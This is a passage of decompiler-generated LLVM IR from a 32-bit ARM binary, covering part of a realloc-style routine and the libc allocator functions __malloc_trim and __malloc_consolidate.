  %v1_13150.pre = load i32, i32* @r4, align 4
  %v1_13148 = add i32 %v0_13138, -4
  %v2_13148 = inttoptr i32 %v1_13148 to i32*
  %v3_13148 = load i32, i32* %v2_13148, align 4
  store i32 %v3_13148, i32* @r3, align 4
  %v1_1314c = add i32 %v0_13138, -8
  store i32 %v1_1314c, i32* @r7, align 4
  %v9_13150 = icmp eq i32 %v1_1314c, %v1_13150.pre
  br i1 %v9_13150, label %.thread2, label %dec_label_pc_13160

.thread2:                                         ; preds = %dec_label_pc_13148
  %v2_13154 = and i32 %v3_13148, -4
  store i32 %v2_13154, i32* %r3.global-to-local, align 4
  %v2_13158 = load i32, i32* @r6, align 4
  %v3_13158 = add i32 %v2_13158, %v2_13154
  store i32 %v3_13158, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_131e8

dec_label_pc_13160:                               ; preds = %dec_label_pc_13148
  %v0_13160 = load i32, i32* @r6, align 4
  %v1_13160 = add i32 %v0_13160, -4
  store i32 %v1_13160, i32* @r2, align 4
  %v3_13164 = udiv i32 %v1_13160, 4
  store i32 %v3_13164, i32* @ip, align 4
  %tmp37 = and i32 %v1_13160, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_1316c = icmp ult i32 %v1_13160, 36
  %v3_1316c = or i1 %tmp38, %v2_1316c
  %v0_1317c = load i32, i32* @r5, align 4
  br i1 %v3_1316c, label %dec_label_pc_1317c, label %dec_label_pc_13170

dec_label_pc_13170:                               ; preds = %dec_label_pc_13160
  store i32 %v0_1317c, i32* @r1, align 4
  %v0_13174 = call i32 @memcpy()
  store i32 %v0_13174, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_1317c:                               ; preds = %dec_label_pc_13160
  %v1_1317c = inttoptr i32 %v0_1317c to i32*
  %v2_1317c = load i32, i32* %v1_1317c, align 4
  store i32 %v2_1317c, i32* %r3.global-to-local, align 4
  %v2_13180 = inttoptr i32 %v0_13138 to i32*
  store i32 %v2_1317c, i32* %v2_13180, align 4
  %v0_13184 = load i32, i32* @r5, align 4
  %v1_13184 = add i32 %v0_13184, 4
  %v2_13184 = inttoptr i32 %v1_13184 to i32*
  %v3_13184 = load i32, i32* %v2_13184, align 4
  store i32 %v3_13184, i32* %r3.global-to-local, align 4
  %v1_13188 = load i32, i32* %r1.global-to-local, align 4
  %v2_13188 = add i32 %v1_13188, 4
  %v3_13188 = inttoptr i32 %v2_13188 to i32*
  store i32 %v3_13184, i32* %v3_13188, align 4
  %v0_1318c = load i32, i32* @r5, align 4
  %v1_1318c = add i32 %v0_1318c, 8
  %v2_1318c = inttoptr i32 %v1_1318c to i32*
  %v3_1318c = load i32, i32* %v2_1318c, align 4
  store i32 %v3_1318c, i32* %r3.global-to-local, align 4
  %v0_13190 = load i32, i32* @ip, align 4
  %v1_13194 = load i32, i32* %r1.global-to-local, align 4
  %v2_13194 = add i32 %v1_13194, 8
  %v3_13194 = inttoptr i32 %v2_13194 to i32*
  store i32 %v3_1318c, i32* %v3_13194, align 4
  %tmp39 = icmp ult i32 %v0_13190, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_1319c

dec_label_pc_1319c:                               ; preds = %dec_label_pc_1317c
  %v0_1319c = load i32, i32* @r5, align 4
  %v1_1319c = add i32 %v0_1319c, 12
  %v2_1319c = inttoptr i32 %v1_1319c to i32*
  %v3_1319c = load i32, i32* %v2_1319c, align 4
  store i32 %v3_1319c, i32* %r3.global-to-local, align 4
  %v1_131a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_131a0 = add i32 %v1_131a0, 12
  %v3_131a0 = inttoptr i32 %v2_131a0 to i32*
  store i32 %v3_1319c, i32* %v3_131a0, align 4
  %v0_131a4 = load i32, i32* @r5, align 4
  %v1_131a4 = add i32 %v0_131a4, 16
  %v2_131a4 = inttoptr i32 %v1_131a4 to i32*
  %v3_131a4 = load i32, i32* %v2_131a4, align 4
  store i32 %v3_131a4, i32* %r3.global-to-local, align 4
  %v0_131a8 = load i32, i32* @ip, align 4
  %v1_131ac = load i32, i32* %r1.global-to-local, align 4
  %v2_131ac = add i32 %v1_131ac, 16
  %v3_131ac = inttoptr i32 %v2_131ac to i32*
  store i32 %v3_131a4, i32* %v3_131ac, align 4
  %tmp40 = icmp ult i32 %v0_131a8, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_131b4

dec_label_pc_131b4:                               ; preds = %dec_label_pc_1319c
  %v0_131b4 = load i32, i32* @r5, align 4
  %v1_131b4 = add i32 %v0_131b4, 20
  %v2_131b4 = inttoptr i32 %v1_131b4 to i32*
  %v3_131b4 = load i32, i32* %v2_131b4, align 4
  store i32 %v3_131b4, i32* %r3.global-to-local, align 4
  %v1_131b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_131b8 = add i32 %v1_131b8, 20
  %v3_131b8 = inttoptr i32 %v2_131b8 to i32*
  store i32 %v3_131b4, i32* %v3_131b8, align 4
  %v0_131bc = load i32, i32* @r5, align 4
  %v1_131bc = add i32 %v0_131bc, 24
  %v2_131bc = inttoptr i32 %v1_131bc to i32*
  %v3_131bc = load i32, i32* %v2_131bc, align 4
  store i32 %v3_131bc, i32* %r3.global-to-local, align 4
  %v1_131c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_131c0 = add i32 %v1_131c0, 24
  %v3_131c0 = inttoptr i32 %v2_131c0 to i32*
  store i32 %v3_131bc, i32* %v3_131c0, align 4
  %v0_131c4 = load i32, i32* @ip, align 4
  %v7_131c4 = icmp eq i32 %v0_131c4, 9
  br i1 %v7_131c4, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_131b4
  %v1_131c8 = load i32, i32* @r5, align 4
  %v2_131c8 = add i32 %v1_131c8, 28
  %v3_131c8 = inttoptr i32 %v2_131c8 to i32*
  %v4_131c8 = load i32, i32* %v3_131c8, align 4
  store i32 %v4_131c8, i32* %r3.global-to-local, align 4
  %v2_131cc = load i32, i32* %r1.global-to-local, align 4
  %v3_131cc = add i32 %v2_131cc, 28
  %v4_131cc = inttoptr i32 %v3_131cc to i32*
  store i32 %v4_131c8, i32* %v4_131cc, align 4
  %v1_131d0 = load i32, i32* @r5, align 4
  %v2_131d0 = add i32 %v1_131d0, 32
  %v3_131d0 = inttoptr i32 %v2_131d0 to i32*
  %v4_131d0 = load i32, i32* %v3_131d0, align 4
  store i32 %v4_131d0, i32* %r3.global-to-local, align 4
  %v2_131d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_131d4 = add i32 %v2_131d4, 32
  %v4_131d4 = inttoptr i32 %v3_131d4 to i32*
  store i32 %v4_131d0, i32* %v4_131d4, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_131b4, %dec_label_pc_1319c, %dec_label_pc_1317c, %dec_label_pc_13170, %bb32
  %v0_131d8 = load i32, i32* @r5, align 4
  store i32 %v0_131d8, i32* @r0, align 4
  %v0_131dc = call i32 @free()
  store i32 %v0_131dc, i32* %r0.global-to-local, align 4
  %v0_131e0 = load i32, i32* @r7, align 4
  %v1_131e0 = add i32 %v0_131e0, 8
  store i32 %v1_131e0, i32* @r4, align 4
  br label %dec_label_pc_1331c

dec_label_pc_131e8:                               ; preds = %bb30, %.thread2, %dec_label_pc_13128
  %v0_131fc = phi i32 [ %v3_13158, %.thread2 ], [ %v1_13070, %bb30 ], [ %v1_131e8.pre, %dec_label_pc_13128 ]
  %v0_131e8 = load i32, i32* @sb, align 4
  %v2_131e8 = sub i32 %v0_131fc, %v0_131e8
  store i32 %v2_131e8, i32* %r1.global-to-local, align 4
  %v0_131f0 = load i32, i32* @sl, align 4
  %v1_131f0 = add i32 %v0_131f0, 4
  %v2_131f0 = inttoptr i32 %v1_131f0 to i32*
  %v3_131f0 = load i32, i32* %v2_131f0, align 4
  %tmp41 = icmp ugt i32 %v2_131e8, 15
  %v1_13218 = urem i32 %v3_131f0, 2
  store i32 %v1_13218, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_13218, label %dec_label_pc_131f8

dec_label_pc_131f8:                               ; preds = %dec_label_pc_131e8
  %v2_131fc = or i32 %v1_13218, %v0_131fc
  store i32 %v2_131fc, i32* %r3.global-to-local, align 4
  store i32 %v2_131fc, i32* %v2_131f0, align 4
  %v0_13204 = load i32, i32* @sl, align 4
  %v1_13204 = load i32, i32* %r0.global-to-local, align 4
  %v2_13204 = add i32 %v1_13204, %v0_13204
  store i32 %v2_13204, i32* %r2.global-to-local, align 4
  %v1_13208 = add i32 %v2_13204, 4
  %v2_13208 = inttoptr i32 %v1_13208 to i32*
  %v3_13208 = load i32, i32* %v2_13208, align 4
  %v1_1320c = or i32 %v3_13208, 1
  store i32 %v1_1320c, i32* %r3.global-to-local, align 4
  store i32 %v1_1320c, i32* %v2_13208, align 4
  br label %dec_label_pc_13248

dec_label_pc_13218:                               ; preds = %dec_label_pc_131e8
  %v2_1321c = add i32 %v0_131f0, %v0_131e8
  store i32 %v2_1321c, i32* %r0.global-to-local, align 4
  %v2_13220 = or i32 %v1_13218, %v0_131e8
  store i32 %v2_13220, i32* %r3.global-to-local, align 4
  %v1_13224 = or i32 %v2_131e8, 1
  store i32 %v1_13224, i32* %r2.global-to-local, align 4
  store i32 %v2_13220, i32* %v2_131f0, align 4
  %v0_1322c = load i32, i32* %r2.global-to-local, align 4
  %v1_1322c = load i32, i32* %r0.global-to-local, align 4
  %v2_1322c = add i32 %v1_1322c, 4
  %v3_1322c = inttoptr i32 %v2_1322c to i32*
  store i32 %v0_1322c, i32* %v3_1322c, align 4
  %v0_13230 = load i32, i32* %r0.global-to-local, align 4
  %v1_13230 = load i32, i32* %r1.global-to-local, align 4
  %v2_13230 = add i32 %v1_13230, %v0_13230
  store i32 %v2_13230, i32* %r2.global-to-local, align 4
  %v1_13234 = add i32 %v2_13230, 4
  %v2_13234 = inttoptr i32 %v1_13234 to i32*
  %v3_13234 = load i32, i32* %v2_13234, align 4
  %v1_13238 = or i32 %v3_13234, 1
  store i32 %v1_13238, i32* %r3.global-to-local, align 4
  store i32 %v1_13238, i32* %v2_13234, align 4
  %v0_13240 = load i32, i32* %r0.global-to-local, align 4
  %v1_13240 = add i32 %v0_13240, 8
  store i32 %v1_13240, i32* @r0, align 4
  %v0_13244 = call i32 @free()
  store i32 %v0_13244, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13248

dec_label_pc_13248:                               ; preds = %dec_label_pc_131f8, %dec_label_pc_13218
  %v0_13248 = load i32, i32* @sl, align 4
  %v1_13248 = add i32 %v0_13248, 8
  store i32 %v1_13248, i32* @r4, align 4
  br label %dec_label_pc_1331c

dec_label_pc_13250:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r1.global-to-local, align 4
  %v4_13258 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 64) to i32*), align 4
  store i32 %v4_13258, i32* @r8, align 4
  %v2_1325c = inttoptr i32 %v1_1306c to i32*
  %v3_1325c = load i32, i32* %v2_1325c, align 4
  store i32 %v3_1325c, i32* @r4, align 4
  %v1_13260 = add i32 %v4_13258, 860
  %v2_13260 = inttoptr i32 %v1_13260 to i32*
  %v3_13260 = load i32, i32* %v2_13260, align 4
  %v1_13264 = add i32 %v3_1325c, 4
  %v1_13268 = add i32 %v3_13260, -1
  store i32 %v1_13268, i32* %r2.global-to-local, align 4
  %v2_1326c = add i32 %v1_13264, %v1_13268
  %v1_13270 = load i32, i32* @sb, align 4
  %v2_13270 = add i32 %v2_1326c, %v1_13270
  store i32 %v2_13270, i32* %r3.global-to-local, align 4
  %v2_13274 = sub i32 0, %v3_13260
  %v3_13274 = and i32 %v2_13270, %v2_13274
  store i32 %v3_13274, i32* @r7, align 4
  %v2_13278 = sub i32 %v3_13274, %v3_1325c
  store i32 %v2_13278, i32* @fp, align 4
  %v9_1327c = icmp eq i32 %v1_13070, %v2_13278
  br i1 %v9_1327c, label %dec_label_pc_132f0, label %dec_label_pc_13284

dec_label_pc_13284:                               ; preds = %dec_label_pc_13250
  %v2_13284 = sub i32 %v1_1306c, %v3_1325c
  store i32 %v2_13284, i32* %r0.global-to-local, align 4
  %v2_13288 = add i32 %v3_1325c, %v1_13070
  store i32 %v2_13288, i32* %r1.global-to-local, align 4
  store i32 %v3_13274, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_13294 = call i32 @mremap(i32 %v2_13284, i32 %v2_13288, i32 %v3_13274, i32 1)
  store i32 %v4_13294, i32* %r0.global-to-local, align 4
  %v7_13298 = icmp eq i32 %v4_13294, -1
  br i1 %v7_13298, label %dec_label_pc_132e4, label %dec_label_pc_132a0

dec_label_pc_132a0:                               ; preds = %dec_label_pc_13284
  %v1_132a0 = load i32, i32* @r4, align 4
  %v2_132a0 = add i32 %v1_132a0, %v4_13294
  store i32 %v2_132a0, i32* %r0.global-to-local, align 4
  %v0_132a4 = load i32, i32* @fp, align 4
  %v1_132a4 = or i32 %v0_132a4, 2
  store i32 %v1_132a4, i32* %r3.global-to-local, align 4
  %v2_132a8 = add i32 %v2_132a0, 4
  %v3_132a8 = inttoptr i32 %v2_132a8 to i32*
  store i32 %v1_132a4, i32* %v3_132a8, align 4
  %v0_132ac = load i32, i32* @r8, align 4
  %v1_132ac = add i32 %v0_132ac, 868
  %v2_132ac = inttoptr i32 %v1_132ac to i32*
  %v3_132ac = load i32, i32* %v2_132ac, align 4
  store i32 %v3_132ac, i32* %r3.global-to-local, align 4
  %v1_132b0 = add i32 %v0_132ac, 880
  %v2_132b0 = inttoptr i32 %v1_132b0 to i32*
  %v3_132b0 = load i32, i32* %v2_132b0, align 4
  store i32 %v3_132b0, i32* %r2.global-to-local, align 4
  %v0_132b4 = load i32, i32* @r6, align 4
  %v2_132b4 = sub i32 %v3_132ac, %v0_132b4
  store i32 %v2_132b4, i32* %r3.global-to-local, align 4
  %v1_132b8 = load i32, i32* @r7, align 4
  %v2_132b8 = add i32 %v1_132b8, %v2_132b4
  store i32 %v2_132b8, i32* %r1.global-to-local, align 4
  %v1_132bc = add i32 %v0_132ac, 872
  %v2_132bc = inttoptr i32 %v1_132bc to i32*
  %v3_132bc = load i32, i32* %v2_132bc, align 4
  store i32 %v3_132bc, i32* %r3.global-to-local, align 4
  %v1_132c4 = add i32 %v0_132ac, 884
  %v2_132c4 = inttoptr i32 %v1_132c4 to i32*
  %v3_132c4 = load i32, i32* %v2_132c4, align 4
  store i32 %v3_132c4, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_132b8, %v3_132b0
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_132a0
  store i32 %v2_132b8, i32* %v2_132b0, align 4
  %v0_132cc.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_132cc.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_132a0, %bb33
  %v1_132cc = phi i32 [ %v0_132ac, %dec_label_pc_132a0 ], [ %v1_132cc.pre, %bb33 ]
  %v0_132cc = phi i32 [ %v2_132b8, %dec_label_pc_132a0 ], [ %v0_132cc.pre, %bb33 ]
  %v2_132cc = add i32 %v1_132cc, 868
  %v3_132cc = inttoptr i32 %v2_132cc to i32*
  store i32 %v0_132cc, i32* %v3_132cc, align 4
  %v0_132d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_132d0 = load i32, i32* %r3.global-to-local, align 4
  %v2_132d0 = add i32 %v1_132d0, %v0_132d0
  store i32 %v2_132d0, i32* %r1.global-to-local, align 4
  %v1_132d4 = load i32, i32* %r2.global-to-local, align 4
  %v0_132d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_132d8 = add i32 %v0_132d8, 8
  store i32 %v1_132d8, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_132d0, %v1_132d4
  br i1 %tmp43, label %bb35, label %dec_label_pc_1331c

bb35:                                             ; preds = %bb34
  %v5_132dc = load i32, i32* @r8, align 4
  %v6_132dc = add i32 %v5_132dc, 884
  %v7_132dc = inttoptr i32 %v6_132dc to i32*
  store i32 %v2_132d0, i32* %v7_132dc, align 4
  br label %dec_label_pc_1331c

dec_label_pc_132e4:                               ; preds = %dec_label_pc_13284
  %v0_132e4 = load i32, i32* @sb, align 4
  %v1_132e4 = add i32 %v0_132e4, 4
  store i32 %v1_132e4, i32* %r3.global-to-local, align 4
  %v0_132e8 = load i32, i32* @r6, align 4
  %v3_132e8 = icmp ult i32 %v0_132e8, %v1_132e4
  br i1 %v3_132e8, label %dec_label_pc_132f8, label %dec_label_pc_132e4.dec_label_pc_132f0_crit_edge

dec_label_pc_132e4.dec_label_pc_132f0_crit_edge:  ; preds = %dec_label_pc_132e4
  %v0_132f0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_132f0

dec_label_pc_132f0:                               ; preds = %dec_label_pc_132e4.dec_label_pc_132f0_crit_edge, %dec_label_pc_13250
  %v0_132f0 = phi i32 [ %v0_132f0.pre, %dec_label_pc_132e4.dec_label_pc_132f0_crit_edge ], [ %v0_13058, %dec_label_pc_13250 ]
  store i32 %v0_132f0, i32* @r4, align 4
  br label %dec_label_pc_1331c

dec_label_pc_132f8:                               ; preds = %dec_label_pc_132e4
  %v1_132f8 = add i32 %v0_132e4, -7
  store i32 %v1_132f8, i32* @r0, align 4
  %v0_132fc = call i32 @malloc()
  store i32 %v0_132fc, i32* @r0, align 4
  store i32 %v0_132fc, i32* @r4, align 4
  %v2_13300 = icmp eq i32 %v0_132fc, 0
  br i1 %v2_13300, label %dec_label_pc_1331c, label %dec_label_pc_13308

dec_label_pc_13308:                               ; preds = %dec_label_pc_132f8
  %v0_13308 = load i32, i32* @r6, align 4
  %v1_13308 = add i32 %v0_13308, -8
  store i32 %v1_13308, i32* @r2, align 4
  %v0_1330c = load i32, i32* @r5, align 4
  store i32 %v0_1330c, i32* @r1, align 4
  %v0_13310 = call i32 @memcpy()
  %v0_13314 = load i32, i32* @r5, align 4
  store i32 %v0_13314, i32* @r0, align 4
  %v0_13318 = call i32 @free()
  store i32 %v0_13318, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1331c

dec_label_pc_1331c:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_132f8, %dec_label_pc_132f0, %dec_label_pc_13248, %.thread6, %dec_label_pc_130b8, %dec_label_pc_13308
  store i32 %v2_13004, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r2.global-to-local, align 4
  %v4_1332c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 44) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1332c)
  br label %dec_label_pc_13338

dec_label_pc_13338:                               ; preds = %dec_label_pc_13038, %dec_label_pc_12fe0, %dec_label_pc_12fc8, %dec_label_pc_1331c
  %v0_13338 = load i32, i32* @r4, align 4
  store i32 %v0_13338, i32* %r0.global-to-local, align 4
  store i32 %v3_12fa8, i32* @r4, align 4
  store i32 %v6_12fa8, i32* @r5, align 4
  store i32 %v9_12fa8, i32* @r6, align 4
  store i32 %v12_12fa8, i32* @r7, align 4
  store i32 %v15_12fa8, i32* @r8, align 4
  store i32 %v18_12fa8, i32* @sb, align 4
  store i32 %v21_12fa8, i32* @sl, align 4
  store i32 %v24_12fa8, i32* @fp, align 4
  store i32 %v27_12fa8, i32* @lr, align 4
  ret i32 %v0_13338

; uselistorder directives
  uselistorder i32 %v2_132d0, { 1, 0, 2 }
  uselistorder i32 %v2_132b8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13294, { 1, 0, 2 }
  uselistorder i32 %v3_13274, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13218, { 2, 1, 0 }
  uselistorder i32 %v2_131e8, { 1, 0, 2 }
  uselistorder i32 %v0_1317c, { 1, 0 }
  uselistorder i32 %v0_13138, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_1309c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_13094, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_13078, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_13070, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_1306c, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_1305c, { 1, 0 }
  uselistorder i32 %v0_13058, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_13030, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 11, 7, 8, 9, 10, 21, 12, 14, 13, 20, 22, 15, 16, 17, 18, 19, 25, 24, 23, 26, 27 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_13338, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1331c, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_13248, { 1, 0 }
  uselistorder label %dec_label_pc_131e8, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_13134, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13128, { 1, 0 }
  uselistorder label %dec_label_pc_13124, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_1334c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1334c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_1334c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1334c, label %.thread3, label %.thread5

.thread3:                                         ; preds = %dec_label_pc_1334c
  store i32 0, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 0)
  %v0_13360.pr.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13360.pr.pr.pr, label %bb, label %.thread3..thread5_crit_edge

.thread3..thread5_crit_edge:                      ; preds = %.thread3
  %v4_13364.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread5

bb:                                               ; preds = %.thread3
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread3..thread5_crit_edge, %dec_label_pc_1334c, %bb
  %v4_13364 = phi i32 [ %v4_13364.pre, %.thread3..thread5_crit_edge ], [ %arg1, %dec_label_pc_1334c ], [ 0, %bb ]
  ret i32 %v4_13364

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_13368 = add i32 %arg2, 44
  %v2_13368 = inttoptr i32 %v1_13368 to i32*
  %v3_13368 = load i32, i32* %v2_13368, align 4
  %v12_1336c = load i32, i32* @r7, align 4
  %v1_13370 = add i32 %v3_13368, 4
  %v2_13370 = inttoptr i32 %v1_13370 to i32*
  %v3_13370 = load i32, i32* %v2_13370, align 4
  %v1_13374 = add i32 %arg2, 860
  %v2_13374 = inttoptr i32 %v1_13374 to i32*
  %v3_13374 = load i32, i32* %v2_13374, align 4
  store i32 %v3_13374, i32* @r4, align 4
  %v1_13378 = and i32 %v3_13370, -4
  store i32 %v1_13378, i32* @r6, align 4
  %v1_1337c = add i32 %v1_13378, -17
  %v2_13380 = add i32 %v1_1337c, %v3_13374
  store i32 %arg2, i32* @r5, align 4
  %v2_1338c = sub i32 %v2_13380, %arg1
  store i32 %v3_13374, i32* %r1.global-to-local, align 4
  %v2_13394 = udiv i32 %v2_1338c, %v3_13374
  %v1_13398 = add i32 %v2_13394, -1
  store i32 %v1_13398, i32* %r0.global-to-local, align 4
  %v2_1339c = mul i32 %v1_13398, %v3_13374
  store i32 %v2_1339c, i32* @r7, align 4
  %v2_133a0 = icmp eq i32 %v2_1339c, 0
  store i1 %v2_133a0, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_1339c, 1
  br i1 %tmp8, label %dec_label_pc_13408, label %dec_label_pc_133a8

dec_label_pc_133a8:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_133ac = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_133ac, i32* %r0.global-to-local, align 4
  %v0_133b0 = load i32, i32* @r5, align 4
  %v1_133b0 = add i32 %v0_133b0, 44
  %v2_133b0 = inttoptr i32 %v1_133b0 to i32*
  %v3_133b0 = load i32, i32* %v2_133b0, align 4
  %v0_133b4 = load i32, i32* @r6, align 4
  %v2_133b4 = add i32 %v0_133b4, %v3_133b0
  %v9_133b8 = icmp eq i32 %v1_133ac, %v2_133b4
  store i1 %v9_133b8, i1* @cpsr_z, align 1
  store i32 %v1_133ac, i32* @r4, align 4
  br i1 %v9_133b8, label %dec_label_pc_133c4, label %dec_label_pc_13408

dec_label_pc_133c4:                               ; preds = %dec_label_pc_133a8
  %v0_133c4 = load i32, i32* @r7, align 4
  %v1_133c4 = sub i32 0, %v0_133c4
  store i32 %v1_133c4, i32* %r0.global-to-local, align 4
  %v1_133c8 = call i32 @__GI_sbrk(i32 %v1_133c4)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_133d0 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_133d0, i32* %r0.global-to-local, align 4
  %v7_133d4 = icmp eq i32 %v1_133d0, -1
  store i1 %v7_133d4, i1* @cpsr_z, align 1
  br i1 %v7_133d4, label %dec_label_pc_13408, label %dec_label_pc_133dc

dec_label_pc_133dc:                               ; preds = %dec_label_pc_133c4
  %v0_133dc = load i32, i32* @r4, align 4
  %v2_133dc = sub i32 %v0_133dc, %v1_133d0
  store i32 %v2_133dc, i32* %r0.global-to-local, align 4
  %v9_133dc = icmp eq i32 %v0_133dc, %v1_133d0
  store i1 %v9_133dc, i1* @cpsr_z, align 1
  br i1 %v9_133dc, label %dec_label_pc_13408, label %dec_label_pc_133e4

dec_label_pc_133e4:                               ; preds = %dec_label_pc_133dc
  %v0_133e4 = load i32, i32* @r5, align 4
  %v1_133e4 = add i32 %v0_133e4, 872
  %v2_133e4 = inttoptr i32 %v1_133e4 to i32*
  %v3_133e4 = load i32, i32* %v2_133e4, align 4
  %v1_133e8 = load i32, i32* @r6, align 4
  %v2_133e8 = sub i32 %v1_133e8, %v2_133dc
  store i32 %v2_133e8, i32* %r2.global-to-local, align 4
  %v1_133ec = add i32 %v0_133e4, 44
  %v2_133ec = inttoptr i32 %v1_133ec to i32*
  %v3_133ec = load i32, i32* %v2_133ec, align 4
  store i32 %v3_133ec, i32* %r1.global-to-local, align 4
  %v2_133f0 = sub i32 %v3_133e4, %v2_133dc
  %v1_133f4 = or i32 %v2_133e8, 1
  store i32 %v1_133f4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_133f0, i32* %v2_133e4, align 4
  %v0_13400 = load i32, i32* %r2.global-to-local, align 4
  %v1_13400 = load i32, i32* %r1.global-to-local, align 4
  %v2_13400 = add i32 %v1_13400, 4
  %v3_13400 = inttoptr i32 %v2_13400 to i32*
  store i32 %v0_13400, i32* %v3_13400, align 4
  %v1_13414.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1340c

dec_label_pc_13408:                               ; preds = %dec_label_pc_133a8, %dec_label_pc_133dc, %dec_label_pc_133c4, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1340c

dec_label_pc_1340c:                               ; preds = %dec_label_pc_133e4, %dec_label_pc_13408
  %v1_13414 = phi i32 [ %v1_13414.pre, %dec_label_pc_133e4 ], [ 0, %dec_label_pc_13408 ]
  store i32 %v12_1336c, i32* @r7, align 4
  ret i32 %v1_13414

; uselistorder directives
  uselistorder i1 %v7_133d4, { 1, 0 }
  uselistorder i32 %v1_133d0, { 2, 1, 0, 3 }
  uselistorder i32 %v3_13374, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1340c, { 1, 0 }
  uselistorder label %dec_label_pc_13408, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
